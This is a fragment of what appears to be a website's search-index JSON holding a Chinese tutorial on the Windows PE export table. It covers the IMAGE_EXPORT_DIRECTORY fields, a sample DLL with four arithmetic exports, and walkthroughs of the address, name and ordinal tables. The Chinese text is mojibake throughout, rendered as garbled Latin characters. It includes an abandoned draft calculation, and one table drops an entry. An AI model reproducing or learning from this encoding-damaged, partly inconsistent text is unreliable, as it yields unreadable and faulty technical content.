æ•°æ®ç›¸å¯¹.dataåŒºå—å¼€å¤´çš„åç§»é‡ä¸ºï¼š00024A30-00024000=A30 .dataçš„ROffsetæ˜¯11C00ï¼Œ+A30=12630hã€‚ å»12630hæ‰¾è¿™ä¸ªå€¼ï¼Œä¿®æ”¹è¿™ä¸ªå€¼ä¸º0x88888888ï¼Œç„¶åé‡æ–°è¿è¡Œexeã€‚"},{"title":"å¯¼å‡ºè¡¨","path":"/wiki/PE/å¯¼å‡ºè¡¨.html","content":"å‰è¨€ ä¸€ä¸ªexeçš„è¿›ç¨‹ç©ºé—´ç”±å¤šä¸ªæ¨¡å—ç»„æˆã€‚ç”¨ODæ‰“å¼€fg.exeï¼Œç‚¹å‡»æŒ‰é’®Eï¼Œå¯ä»¥çœ‹åˆ°è¿›ç¨‹ç©ºé—´ä¸­æ‰€æœ‰çš„æ¨¡å—ã€‚åŒå‡»è¿è¡Œfgæ—¶ï¼Œfgå¦‚ä½•çŸ¥é“éœ€è¦åŠ è½½å“ªäº›æ¨¡å—åˆ°è‡ªå·±çš„è¿›ç¨‹ç©ºé—´ä¸­ï¼Ÿ å¯¼å…¥è¡¨ï¼šè®°å½•å½“å‰PEæ–‡ä»¶éœ€è¦ç”¨åˆ°çš„å…¶ä»–PEæ–‡ä»¶æœ‰å“ªäº›ï¼Œä»¥åŠç”¨åˆ°äº†å…¶ä»–PEæ–‡ä»¶ä¸­çš„å“ªäº›å‡½æ•° å¯¼å‡ºè¡¨ï¼šå­˜å‚¨å½“å‰PEæ–‡ä»¶æä¾›äº†å“ªäº›å‡½æ•°ç»™åˆ«äººç”¨ï¼Œå‡½æ•°çš„åœ°å€æ˜¯å¤šå°‘ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œdllæä¾›å‡½æ•°ç»™åˆ«äººç”¨ï¼ˆæœ‰å¯¼å‡ºè¡¨ï¼‰ï¼Œexeç”¨åˆ«äººæä¾›çš„å‡½æ•°ï¼ˆæ²¡å¯¼å‡ºè¡¨ï¼‰ã€‚ä½†å®é™…ä¸Šï¼Œexeå’Œdlléƒ½æ˜¯PEæ–‡ä»¶ï¼Œéƒ½å¯ä»¥æä¾›å‡½æ•°ç»™åˆ«äººç”¨ï¼Œéƒ½å¯ä»¥æœ‰å¯¼å‡ºè¡¨ã€‚ æœ¬å°èŠ‚è®²è§£å¯¼å‡ºè¡¨ï¼Œä»æ‹“å±•PEå¤´æ•°æ®ç›®å½•è¡¨æ•°æ®çš„ç¬¬ä¸€ä¸ªæˆå‘˜å¾—åˆ°å¯¼å‡ºè¡¨çš„èµ·å§‹åœ°å€ï¼ˆè¿™ä¸ªå€¼æ˜¯RVAï¼‰å’Œå¤§å°ã€‚ 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; è¿™ä¸ªSizeæ˜¯ç®—ä¸Šå¯¼å‡ºè¡¨IMAGE_EXPORT_DIRECTORYç»“æ„ä½“+å…¶å­è¡¨ä¸€å…±å ç”¨çš„ç©ºé—´ï¼Œå•è®ºIMAGE_EXPORT_DIRECTORYç»“æ„ä½“çš„å¤§å°æ˜¯40ä¸ªå­—èŠ‚ã€‚ Sizeè¿™ä¸ªå€¼æ˜¯ç¼–è¯‘å™¨ç¼–è¯‘åå¡«å†™çš„å€¼ï¼Œæ²¡æœ‰å®é™…æ„ä¹‰ã€‚å¯¼å‡ºè¡¨æœ‰è‡ªå·±çš„æ ¼å¼ç»“æ„ä½“å­—æ®µæ¥æ‰¾åˆ°å®ƒçš„æ•°æ®ï¼Œè¿™ä¸ªSizeè¯´æ˜¯æ”¹æ‰ä¹Ÿå¯ä»¥ï¼Œä¸å½±å“æ‰§è¡Œï¼Œä½†ä¿ºè¿˜æ²¡è¯•è¿‡ å¯¼å‡ºè¡¨ 1234567891011121314typedef struct _IMAGE_EXPORT_DIRECTORY&#123; DWORD Characteristics; // æœªä½¿ç”¨ DWORD TimeDateStamp; // æ—¶é—´æˆ³ï¼Œè¡¨ç¤ºå½“å‰PEæ–‡ä»¶ï¼ˆDLLï¼‰ç¼–è¯‘æ—¶çš„æ—¶é—´ WORD MajorVersion; // æœªä½¿ç”¨ WORD MinorVersion; // æœªä½¿ç”¨ DWORD Name; // å½“å‰å¯¼å‡ºè¡¨æ–‡ä»¶åï¼ˆå­—ç¬¦ä¸²ï¼‰çš„èµ·å§‹åœ°å€ï¼Œæ˜¯ä¸ªRVAå€¼ DWORD Base; // å¯¼å‡ºå‡½æ•°èµ·å§‹åºå·ï¼Œç”¨äºè®¡ç®—å¯¼å‡ºå‡½æ•°çš„å®é™…åºå· DWORD NumberOfFunctions; // æ‰€æœ‰å¯¼å‡ºå‡½æ•°çš„ä¸ªæ•°ï¼ŒåŒ…æ‹¬å…·åå’ŒåŒ¿åå‡½æ•° DWORD NumberOfNames; // å…·åå¯¼å‡ºå‡½æ•°çš„ä¸ªæ•° DWORD AddressOfFunctions; // å¯¼å‡ºå‡½æ•°åœ°å€è¡¨çš„èµ·å§‹åœ°å€ï¼Œæ˜¯ä¸ªRVAå€¼ DWORD AddressOfNames; // å¯¼å‡ºå‡½æ•°åç§°è¡¨çš„èµ·å§‹åœ°å€ï¼Œæ˜¯ä¸ªRVAå€¼ DWORD AddressOfNameOrdinals; // å¯¼å‡ºå‡½æ•°åºå·è¡¨çš„èµ·å§‹åœ°å€ï¼Œæ˜¯ä¸ªRVAå€¼&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; Characteristicsï¼šæœªä½¿ç”¨ï¼Œæ€»æ˜¯ä¸º0 TimeDateStampï¼šæ—¶é—´æˆ³ï¼Œå½“å‰DLLæ–‡ä»¶ç¼–è¯‘æ—¶çš„æ—¶é—´ GMTæ—¶é—´ï¼ˆå½“å‰æ—¶é—´ä¸1970å¹´01æœˆ01æ—¥00æ—¶00åˆ†00ç§’å·®çš„ç§’æ•°ï¼‰ã€‚ æ ‡å‡†PEä¸­çš„TimeDateStampå­—æ®µå’Œè¿™ä¸ªä¸€æ ·ï¼Œéƒ½æ˜¯è®°å½•å½“å‰PEæ–‡ä»¶ä»€ä¹ˆæ—¶å€™ç”Ÿæˆçš„ã€‚ MajorVersionï¼šè¾“å‡ºè¡¨çš„ä¸»ç‰ˆæœ¬å·ï¼Œæœªä½¿ç”¨ï¼Œè®¾ç½®ä¸º0 MinorVersionï¼šè¾“å‡ºè¡¨çš„æ¬¡ç‰ˆæœ¬å·ï¼Œæœªä½¿ç”¨ï¼Œè®¾ç½®ä¸º0 Nameï¼šæŒ‡å‘ä¸€ä¸ªä»¥â€™\\0â€™ç»“å°¾çš„ASCIIå­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå€¼æ˜¯RVAã€‚æŒ‡å‘çš„å­—ç¬¦ä¸²æ˜¯å½“å‰å¯¼å‡ºè¡¨æ–‡ä»¶çš„åå­—ï¼ˆå¦‚Kernel32.dllï¼‰ã€‚ è¾…åŠ©ä¿¡æ¯ï¼Œå¯ä»¥ä¿®æ”¹ã€‚ Baseï¼šå¯¼å‡ºå‡½æ•°çš„èµ·å§‹åºå·ï¼Œä¹Ÿå°±æ˜¯.defä¸­æœ€å°çš„å¯¼å‡ºåºå·ã€‚ ä½¿ç”¨å¯¼å‡ºåºå·æŸ¥è¯¢å¯¼å‡ºå‡½æ•°å‡½æ•°åœ°å€çš„è¿‡ç¨‹ï¼šå…ˆç”¨å¯¼å‡ºåºå·-Baseï¼ˆèµ·å§‹åºå·ï¼‰ï¼Œç”¨å‡åçš„æ•°å­—ä½œä¸ºç´¢å¼•å»å¯¼å‡ºå‡½æ•°åœ°å€è¡¨æŸ¥è¡¨å¾—åˆ°å¯¼å‡ºå‡½æ•°çš„å‡½æ•°åœ°å€ã€‚ NumberOfFunctionsï¼šå½“å‰PEæ–‡ä»¶ä¸­ä¸€å…±æœ‰å¤šå°‘ä¸ªå¯¼å‡ºå‡½æ•°ï¼Œè¿™ä¸ªæ•°é™¤äº†çœŸå®æœ‰çš„å‡½æ•°åœ°å€ï¼Œè¿˜åŒ…æ‹¬ç©ºç¼ºè¡¥ä½ã€‚ è¿™ä¸ªå­—æ®µçš„å€¼=å¯¼å‡ºå‡½æ•°ä¸­åºå·æœ€å¤§çš„-å¯¼å‡ºå‡½æ•°ä¸­åºå·æœ€å°çš„+1ã€‚æ¯”å¦‚å†™dllæ—¶.defåºå·æœ€å°æ˜¯11ï¼Œæœ€å¤§æ˜¯15ï¼Œé‚£ä¹ˆä¸€å…±æœ‰15-11+1=5ä¸ªã€‚ï¼ˆä¸æ˜¯é‚£ä¹ˆå‡†ç¡®ï¼Œå…·ä½“è§è¿™ç¯‡æ–‡ç« ï¼‰ NumberOfNamesï¼šæœ‰åå¯¼å‡ºå‡½æ•°çš„ä¸ªæ•°ï¼ŒåŒ…æ‹¬å‡½æ•°åˆ«åã€‚ AddressOfFunctionsï¼šå¯¼å‡ºå‡½æ•°åœ°å€è¡¨çš„èµ·å§‹åœ°å€ï¼Œæ˜¯ä¸ªRVAå€¼ã€‚ AddressOfFunctionsæŒ‡å‘äº†ä¸€å¼ è¡¨ï¼Œè¿™å¼ è¡¨é‡Œå­˜å‚¨äº†è¯¥PEæ–‡ä»¶ä¸­æ‰€æœ‰å¯¼å‡ºå‡½æ•°çš„å‡½æ•°åœ°å€ã€‚32ä½ä¸‹å‡½æ•°åœ°å€å®½åº¦ä¸º4å­—èŠ‚ã€‚ å¯¼å‡ºå‡½æ•°åœ°å€è¡¨ï¼ˆEATï¼ŒExport Address Tableï¼‰ï¼šæ•°ç»„ï¼Œé‡Œé¢å­˜çš„æ˜¯æ‰€æœ‰å¯¼å‡ºå‡½æ•°çš„å‡½æ•°åœ°å€ã€‚æœªä½¿ç”¨çš„å¯¼å‡ºåºå·åœ¨è¿™ä¸ªè¡¨é¡¹ç›®ä¸­å¯¹åº”çš„å…ƒç´ ä¸º0ã€‚æ•°ç»„ä¸ªæ•°ç”±NumberOfFunctionsç¡®å®šã€‚ AddressOfNamesï¼šå¯¼å‡ºå‡½æ•°åç§°è¡¨çš„èµ·å§‹åœ°å€ï¼Œæ˜¯ä¸ªRVAå€¼ã€‚ AddressOfNamesæŒ‡å‘äº†ä¸€å¼ è¡¨ï¼Œè¡¨é‡Œå­˜çš„æ˜¯RVAåœ°å€ï¼ˆ32ä½ä¸‹åœ°å€å®½åº¦ä¸º4å­—èŠ‚ï¼‰ï¼Œè¿™ä¸ªåœ°å€æŒ‡å‘ä»¥â€™\\0â€™ä½œä¸ºç»“æŸç¬¦çš„ASCIIå­—ç¬¦ä¸²ã€‚æ‰€æœ‰å¯¼å‡ºå‡½æ•°å‡½æ•°åå’Œåˆ«åçš„å­—ç¬¦ä¸²åœ°å€éƒ½åœ¨è¿™ä¸ªè¡¨ä¸­ã€‚ è¡¨ä¸­å­˜çš„å­—ç¬¦ä¸²åœ°å€æŒ‰å­—ç¬¦ä¸²åç§°ä»å°åˆ°å¤§æ’åºäº†ï¼Œå°çš„å­—ç¬¦ä¸²çš„åœ°å€åœ¨å‰é¢ã€‚æ¯”å¦‚å¯¼å‡ºå‡½æ•°åæœ‰Plusï¼ŒMulï¼ŒDivï¼Œé‚£ä¹ˆåœ¨è¿™ä¸ªè¡¨ä¸­å­˜çš„é¡ºåºä¾æ¬¡æ˜¯Divå­—ç¬¦ä¸²çš„åœ°å€ï¼ŒMulå­—ç¬¦ä¸²çš„åœ°å€ï¼ŒPluså­—ç¬¦ä¸²çš„åœ°å€ã€‚æ•°ç»„ä¸ªæ•°ç”±NumberOfNamesç¡®å®šã€‚ å¯¼å‡ºå‡½æ•°åç§°è¡¨ï¼ˆENTï¼Œ Export Name Tableï¼‰ï¼šæ•°ç»„ï¼Œé‡Œé¢å­˜çš„æ˜¯ä¸ªRVAåœ°å€ï¼Œæ¯ä¸ªåœ°å€å‡æŒ‡å‘ä»¥â€™\\0â€™ä½œä¸ºç»“æŸç¬¦çš„ASCIIå­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å…·åå¯¼å‡ºå‡½æ•°çš„å‡½æ•°åç§°æˆ–åˆ«åã€‚ AddressOfNameOrdinalsï¼šå¯¼å‡ºå‡½æ•°åºå·è¡¨çš„èµ·å§‹åœ°å€ï¼Œæ˜¯ä¸ªRVAå€¼ã€‚ å¯¼å‡ºå‡½æ•°åºå·è¡¨ï¼ˆEOTï¼ŒExport Ordinal Tableï¼Œé€šå¸¸ç§°ä¸ºOrdinal Tableï¼‰ï¼šæ•°ç»„ï¼Œæ¯ä¸ªæˆå‘˜å¤§å°2ä¸ªå­—èŠ‚ï¼Œå­˜çš„æ˜¯å¯¼å‡ºå‡½æ•°çš„åºå·ï¼Œè¿™ä¸ªåºå·+Baseåæ‰æ˜¯.defé‡Œå¯¼å‡ºåºå·çš„å€¼ã€‚ å¯¼å‡ºå‡½æ•°åœ°å€è¡¨ï¼ˆEATï¼ŒExport Address Tableï¼‰ èµ·å§‹åœ°å€ï¼šç”±AddressOfFunctionsæŒ‡å‡ºï¼Œè¿™ä¸ªå€¼æ˜¯ä¸ªRVA æ•°æ®ç»“æ„ï¼šåœ°å€æ•°ç»„ï¼Œå­˜çš„æ˜¯æ‰€æœ‰å¯¼å‡ºå‡½æ•°çš„RVAå‡½æ•°åœ°å€ï¼ŒåŠ ä¸ŠImageBaseæ‰æ˜¯çœŸæ­£çš„å‡½æ•°åœ°å€ã€‚ å…ƒç´ å¤§å°ï¼š4å­—èŠ‚ï¼Œä¸€ä¸ªåœ°å€ å†…å®¹ï¼šå…ƒç´ ä¸ºé0çš„ï¼Œæ˜¯æŸä¸ªå¯¼å‡ºå‡½æ•°çš„å‡½æ•°åœ°å€ï¼›æœªä½¿ç”¨çš„å¯¼å‡ºåºå·åœ¨è¿™ä¸ªåœ°å€æ•°ç»„ä¸­å¯¹åº”çš„å…ƒç´ ä¸º0 æ•°ç»„ä¸ªæ•°ï¼šç”±NumberOfFunctionsç¡®å®š å¯¼å‡ºå‡½æ•°åç§°è¡¨ï¼ˆENTï¼Œ Export Name Tableï¼‰ èµ·å§‹åœ°å€ï¼šç”±AddressOfNamesæŒ‡å‡ºï¼Œè¿™ä¸ªå€¼æ˜¯ä¸ªRVA æ•°æ®ç»“æ„ï¼šåœ°å€æ•°ç»„ å…ƒç´ å¤§å°ï¼šä¸€ä¸ªåœ°å€ï¼Œ32ä½ä¸‹åœ°å€å®½åº¦ä¸º4å­—èŠ‚ å†…å®¹ï¼šæ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªåœ°å€ï¼Œæ¯ä¸ªåœ°å€éƒ½æ˜¯ä¸€ä¸ªæŒ‡å‘ä»¥â€™\\0â€™ä½œä¸ºç»“æŸç¬¦çš„ASCIIå­—ç¬¦ä¸²ã€‚è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¯¼å‡ºå‡½æ•°çš„å‡½æ•°åå’Œåˆ«å æœ‰é¡ºåºï¼šæŒ‰åç§°å¤§å°æ’åºï¼Œå°çš„å­—ç¬¦ä¸²çš„åœ°å€åœ¨å‰é¢ã€‚æ¯”å¦‚å¯¼å‡ºå‡½æ•°æœ‰Plusï¼ŒMulï¼ŒDivï¼Œé‚£ä¹ˆåœ¨è¿™ä¸ªè¡¨ä¸­å­˜çš„å­—ç¬¦ä¸²åœ°å€é¡ºåºä¾æ¬¡æ˜¯Divå­—ç¬¦ä¸²çš„åœ°å€ï¼ŒMulå­—ç¬¦ä¸²çš„åœ°å€ï¼ŒPluså­—ç¬¦ä¸²çš„åœ°å€ æ•°ç»„ä¸ªæ•°ï¼šç”±NumberOfNamesç¡®å®š å‡½æ•°åå­—è¿™ä¸ªå­—ç¬¦ä¸²åœ¨æ–‡ä»¶ä¸­çš„ä½ç½®æ˜¯ä¸ç¡®å®šçš„ï¼›è€Œåç§°è¡¨ä¸­å­—ç¬¦ä¸²åœ°å€æ˜¯æŒ‰å­—ç¬¦ä¸²å¤§å°æ’åºçš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå‡½æ•°åä¸ºAxxå¼€å¤´çš„å­—ç¬¦ä¸²åœ°å€åœ¨åç§°è¡¨ä¸­æ’å‰é¢ï¼Œè€ŒAxxè¿™ä¸ªå‡½æ•°åï¼Œåœ¨æ–‡ä»¶ä¸­å­˜æ”¾çš„ä½ç½®å¯èƒ½æ¯”Bxxè¿™ä¸ªå‡½æ•°åçš„åœ°å€é«˜ å¯¼å‡ºå‡½æ•°åºå·è¡¨ï¼ˆEOTï¼ŒExport Ordinal Tableï¼Œé€šå¸¸ç§°ä¸ºOrdinal Tableï¼‰ èµ·å§‹åœ°å€ï¼šç”±AddressOfNameOrdinalsæŒ‡å‡ºï¼Œè¿™ä¸ªå€¼æ˜¯ä¸ªRVA æ•°æ®ç»“æ„ï¼šæ•°ç»„ï¼Œè¯¥æ•°ç»„å­˜çš„æ˜¯å¯¼å‡ºå‡½æ•°çš„åºå· å…ƒç´ å¤§å°ï¼š2å­—èŠ‚ï¼Œä¸€ä¸ªæ•° å†…å®¹ï¼šæ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªåºå· æ•°ç»„ä¸ªæ•°ï¼šå¯¼å‡ºå‡½æ•°åç§°è¡¨æœ‰å‡ é¡¹ï¼Œè¿™ä¸ªè¡¨å°±æœ‰å‡ é¡¹ï¼Œä¹Ÿå°±æ˜¯NumberOfFunctionsä¸ª åœ°å€è¡¨å’Œåç§°è¡¨å“ªä¸ªè¡¨çš„é¡¹æ•°å¤šï¼Ÿä¸ä¸€å®šï¼Œä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œå¯èƒ½æœ‰å¤šä¸ªä¸åŒçš„åå­—ï¼Œæœ¬å+åˆ«åã€‚è¿™è¿™ç§æƒ…å†µä¸‹ï¼Œåç§°è¡¨ä¸ªæ•°ä¼š&gt;åœ°å€è¡¨ä¸ªæ•°ã€‚ä½†å®é™…å°è¯•ä¸‹æ¥å‘ç°åç§°è¡¨ä¸ªæ•°æ²¡æ³•&gt;åœ°å€è¡¨ä¸ªæ•°ï¼Œå…·ä½“è§è¿™ç¯‡æ–‡ç« ã€‚ ä¾‹ ç”¨VCç¼–è¯‘å¦‚ä¸‹ä»£ç ï¼ˆdebugä¸‹ï¼‰å¾—åˆ°æœ¬å°èŠ‚ä¸­æ¼”ç¤ºçš„dllã€‚ï¼ˆVCç¼–è¯‘å‡ºçš„dllæ–‡ä»¶å¯¹é½å’Œå†…å­˜å¯¹é½éƒ½æ˜¯1000hï¼Œå…å»RVAè½¬FOAçš„è®¡ç®—ï¼‰ ArithmeticOperations.h123456#pragma onceint __stdcall Plus(int x, int y);int __stdcall Sub(int x, int y);int __stdcall Mul(int x, int y);int __stdcall Div(int x, int y);Source.def1234567LIBRARYEXPORTS Plus @12\tSub @16 NONAME\tMul @13\tDiv @17 ArithmeticOperations.cpp123456789101112131415161718#include &quot;ArithmeticOperations.h&quot;int __stdcall Plus(int x, int y)&#123;\treturn x + y;&#125;int __stdcall Sub(int x, int y)&#123;\treturn x - y;&#125;int __stdcall Mul(int x, int y)&#123;\treturn x * y;&#125;int __stdcall Div(int x, int y)&#123;\treturn x / y;&#125; æ ¹æ®æ•°æ®ç›®å½•è¡¨æ‰¾åˆ°å¯¼å‡ºè¡¨çš„RVAä¸ºï¼š0002DF10hï¼Œå¤§å°ä¸º179hã€‚ 179hè®¡ç®—æ¥æºï¼šï¼ˆä¸Šä¸€ä¸ªç¼–è¯‘çš„dllçš„å¤§å°æ˜¯179hï¼Œæƒ³è¯•ç®—çœ‹è¿™ä¸ªå¤§å°è¯•æ€ä¹ˆå¾—åˆ°çš„ã€‚å³ä½¿ç®—ä¸Šå‡½æ•°å‰åçš„int 3ï¼Œç¦»è¿™ä¸ªæ•°è¿˜æ˜¯è¿œè¿œä¸å¤Ÿï¼Œé‚æ”¾å¼ƒã€‚è¿™é‡Œæ˜¯é—ç•™ä¸‹çš„è‰ç¨¿ï¼‰ IMAGE_EXPORT_DIRECTORYç»“æ„ä½“ï¼Œ40ä¸ªå­—èŠ‚ï¼› NameæŒ‡å‘çš„å­è¡¨å¤§å°ï¼Œä»0002DF5Ehèµ·åˆ°2df67hï¼Œå¤§å°ä¸º10ä¸ªå­—èŠ‚ï¼› AddressOfFunctionsæŒ‡å‘çš„å­è¡¨å¤§å°ï¼Œä»0002DF38hèµ·åˆ°0002DF4bhï¼Œ20ä¸ªå­—èŠ‚ï¼›æ¯é¡¹æ˜¯ä¸ªå‡½æ•°åœ°å€ï¼Œè¿˜è¦ç®—ä¸Šè¿™æ®µå‡½æ•°ç¡¬ç¼–ç å çš„ç©ºé—´ï¼Œjmp+çœŸæ­£çš„å‡½æ•°ï¼ŒPluså‡½æ•°å 5å­—èŠ‚ï¼ˆjmpï¼‰+39ï¼ˆå‡½æ•°å†…å®¹ï¼‰=44å­—èŠ‚ï¼ŒMulå‡½æ•°å 5+40=45å­—èŠ‚ï¼ŒSubå‡½æ•°å 5+39=44å­—èŠ‚ï¼ŒDivå‡½æ•°å 5+40=45å­—èŠ‚ï¼›ä¸€å…±20+44+45+44+45=198å­—èŠ‚ AddressOfNamesæŒ‡å‘çš„å­è¡¨å¤§å°ï¼Œä»0002DF4Chèµ·åˆ°0002DF57hï¼Œ12ä¸ªå­—èŠ‚ï¼›è¡¨é¡¹æŒ‡å‘çš„å­—ç¬¦ä¸²å çš„ç©ºé—´ï¼Œä»0002DF68håˆ°0002DF70hï¼Œ13ä¸ªå­—èŠ‚ï¼›ä¸€å…±25ä¸ªå­—èŠ‚ï¼› AddressOfNameOrdinalsæŒ‡å‘çš„å­è¡¨å¤§å°ï¼Œä»0002DF58hèµ·åˆ°0002DF5dhï¼Œ6ä¸ªå­—èŠ‚ã€‚ ä¸€å…±40+10+?+25+6=267= 81+?=377 179h=377d å·®296å­—èŠ‚-20=276/4=69ï¼Ÿ å­—æ®µ å€¼ DWORD Characteristics 0h DWORD TimeDateStamp 662B6D63h WORD MajorVersion 0h WORD MinorVersion 0h DWORD Name 0002DF62h DWORD Base Ch DWORD NumberOfFunctions 6 DWORD NumberOfNames 3 DWORD AddressOfFunctions 0002DF38h DWORD AddressOfNames 0002DF50h DWORD AddressOfNameOrdinals 0002DF5Ch Nameå­—æ®µçš„å€¼æ˜¯0002DF62hï¼Œè¿™ä¸ªå€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ï¼Œæ‰¾è¿‡å»å¼€å§‹è¯»ï¼Œä»¥0ç»“å°¾ï¼Œåå­—æ˜¯â€œMyDll.dllâ€ã€‚ï¼ˆä¿ºç”¨VCç¼–è¯‘æ—¶å·¥ç¨‹åæ˜¯MyDll.dllï¼Œæ‹–åˆ°å®ä½“æœºåæ”¹åæ”¹ä¸ºMyDll_VC.dllçš„ï¼‰ å¯¼å‡ºå‡½æ•°åœ°å€è¡¨ AddressOfFunctionså­—æ®µçš„å€¼æ˜¯0002DF38hï¼Œè¿™ä¸ªå€¼æ˜¯å¯¼å‡ºå‡½æ•°åœ°å€è¡¨çš„èµ·å§‹åœ°å€ï¼Œè¿™ä¸ªåœ°å€è¡¨æ¯ä¸€é¡¹å¤§å°æ˜¯4å­—èŠ‚ï¼Œæ‰¾è¿‡å»ï¼Œè¡¨é¡¹çš„æ•°é‡æ˜¯NumberOfFunctionsä¸ªï¼Œå¾—åˆ°å¯¼å‡ºå‡½æ•°åœ°å€è¡¨å¦‚ä¸‹ï¼š åºå· è¡¨é¡¹çš„å†…å®¹ 0 00001014h 1 0000100Ah 2 00000000h 3 00000000h 4 0000100Fh 5 00001005h ï¼ˆåºå·2å’Œ3æ˜¯ç©ºç¼ºä½ï¼Œè¡¥0ï¼Œå› ä¸ºå‰é¢çš„.defæ–‡ä»¶ç”¨çš„åºå·ä¸è¿ç»­ï¼Œæ²¡ç”¨åˆ°åºå·14å’Œåºå·15ï¼‰ Source.def1234567LIBRARYEXPORTS Plus @12\tSub @16 NONAME\tMul @13\tDiv @17 è¡¨é¡¹é‡Œå­˜çš„æ˜¯å‡½æ•°åœ°å€ï¼Œæ˜¯ä¸ªRVAå€¼ã€‚å¯ä»¥é€šè¿‡è¿™ä¸ªåœ°å€æ‰¾è¿‡å»ï¼Œå°†å¯¹åº”çš„å­—èŠ‚è´´åˆ°ODé‡Œçœ‹åæ±‡ç¼–ï¼Œæ¥çŸ¥é“è¿™ä¸ªå‡½æ•°åœ°å€æ˜¯å¯¹åº”ä¸Šé¢å†™çš„Plusã€Subã€Mulã€Divä¸­çš„å“ªä¸€ä¸ªï¼ˆè¿™é‡Œå†™å‡ºå¯¹åº”å†™çš„å“ªä¸ªå‡½æ•°æ˜¯ä¸ºäº†åé¢æŸ¥å¯¼å‡ºè¡¨æ—¶æ–¹ä¾¿è§‚å¯Ÿå­¦ä¹ ï¼‰ã€‚ ä»¥åºå·0ä¸ºä¾‹æ¥ä½“ç°è¿™ä¸ªè¿‡ç¨‹ï¼Œåºå·0è¡¨é¡¹å­˜çš„æ˜¯00001014hï¼ŒæŸ¥è¿‡å»ï¼Œçœ‹åˆ°å­—èŠ‚ç æ˜¯ä¸ªjmpï¼Œä¹Ÿèƒ½æ¥ç€æŸ¥ã€‚jmp+ç›¸å¯¹åç§»ï¼Œç›¸å¯¹åç§»æ˜¯17hï¼Œæ­£æ•°ï¼Œè¯´æ˜å®é™…çš„å‡½æ•°åœ°å€æ¯”è¿™ä¸ªjmpæŒ‡ä»¤é«˜17ä¸ªå­—èŠ‚ã€‚ç›®å‰jmpæŒ‡ä»¤FOAæ˜¯1014hï¼Œä»1019h(jmpæŒ‡ä»¤ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€)åè·³17ä¸ªå­—èŠ‚ï¼Œå°±æ¥åˆ°çœŸæ­£çš„å‡½æ•°åœ°å€ã€‚ çœ‹åˆ°äº†55 8Bï¼ˆå‡½æ•°æ ˆå¸§å¼€å¤´çš„å¥—è·¯ï¼‰ï¼Œéšä¾¿å¤åˆ¶ä¸€æ®µå­—èŠ‚ç ï¼Œå‡è®¾æ˜¯è“é¢œè‰²æ–¹æ¡†é‡Œçš„å†…å®¹ éšä¾¿ç”¨ODæ‰“å¼€ä¸€ä¸ªç¨‹åºï¼Œç„¶åä¿®æ”¹åæ±‡ç¼–åŒºä¸­çš„äºŒè¿›åˆ¶ï¼Œå°†ä¸Šé¢è“é¢œè‰²æ–¹æ¡†çš„å†…å®¹è´´è¿›å»ï¼Œçœ‹å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤æ˜¯ä»€ä¹ˆã€‚è¿™ä¸ªä¾‹å­çœ‹å‡ºæ˜¯Addå‡½æ•° å…¶ä»–ä¸‰ä¸ªå‡½æ•°åœ°å€éƒ½ç”¨è¿™æ ·çš„æ–¹æ³•å¾—çŸ¥å¯¹åº”ä¹‹å‰å†™dllæ—¶çš„å“ªä¸ªå‡½æ•°ã€‚å¯¹ä¸Šé¢çš„è¡¨æ ¼å†åŠ ä¸€åˆ—ï¼Œå¾—åˆ°ä¸‹é¢çš„è¡¨æ ¼ï¼š åºå· è¡¨é¡¹çš„å†…å®¹ å‡è£…çŸ¥é“å‡½æ•°åœ°å€å¯¹åº”ä¸Šé¢å†™çš„å“ªä¸ªå‡½æ•° 0 00001014h Pluså‡½æ•° 1 0000100Ah Mulå‡½æ•° 2 00000000h 3 0000100Fh Subå‡½æ•° 4 00001005h Divå‡½æ•° å¯¼å‡ºå‡½æ•°åç§°è¡¨ AddressOfNameså­—æ®µçš„å€¼æ˜¯0002DF50hï¼Œè¿™ä¸ªå€¼æ˜¯å¯¼å‡ºå‡½æ•°åç§°è¡¨çš„èµ·å§‹åœ°å€ï¼Œè¿™ä¸ªåœ°å€è¡¨æ¯ä¸€é¡¹å¤§å°æ˜¯4å­—èŠ‚ï¼Œè¡¨é¡¹çš„æ•°é‡æ˜¯NumberOfFunctionsä¸ªã€‚è¡¨é¡¹æ˜¯ä¸€ä¸ªæŒ‡å‘å‡½æ•°åç§°å­—ç¬¦ä¸²çš„åœ°å€ã€‚ åºå· è¡¨é¡¹çš„å†…å®¹ è¡¨é¡¹åœ°å€æŒ‡å‘çš„å­—ç¬¦ä¸² 0 0002DF6Ch Div 1 0002DF70h Mul 2 0002DF74h Plus å¯ä»¥çœ‹åˆ°è¿™ä¸ªè¡¨æ˜¯æŒ‰å­—ç¬¦ä¸²ä»å°åˆ°å¤§æ’äº†åºçš„ã€‚ å¯¼å‡ºå‡½æ•°åºå·è¡¨ AddressOfNameOrdinalså­—æ®µçš„å€¼æ˜¯0002DF5Chï¼Œè¿™ä¸ªå€¼æ˜¯å¯¼å‡ºå‡½æ•°åºå·è¡¨çš„èµ·å§‹åœ°å€ï¼Œè¿™ä¸ªåœ°å€è¡¨æ¯ä¸€é¡¹å¤§å°æ˜¯2å­—èŠ‚ï¼Œå¯¼å‡ºå‡½æ•°åç§°è¡¨æœ‰å‡ é¡¹ï¼Œè¿™ä¸ªè¡¨å°±æœ‰å‡ é¡¹ã€‚ åºå· è¡¨é¡¹çš„å†…å®¹ 0 5 1 1 2 0 æŸ¥è¡¨è¿‡ç¨‹ è°ƒç”¨dllä¸­å¯¼å‡ºå‡½æ•°çš„åŠæ³•æ˜¯ç”¨GetProcAddressè·å–dllä¸­å¯¼å‡ºå‡½æ•°çš„å‡½æ•°åœ°å€ï¼Œç„¶åé€šè¿‡è¿™ä¸ªå‡½æ•°åœ°å€æ¥è°ƒç”¨å‡½æ•° 1234FARPROC GetProcAddress( HMODULE hModule, // DLLæ¨¡å—å¥æŸ„ 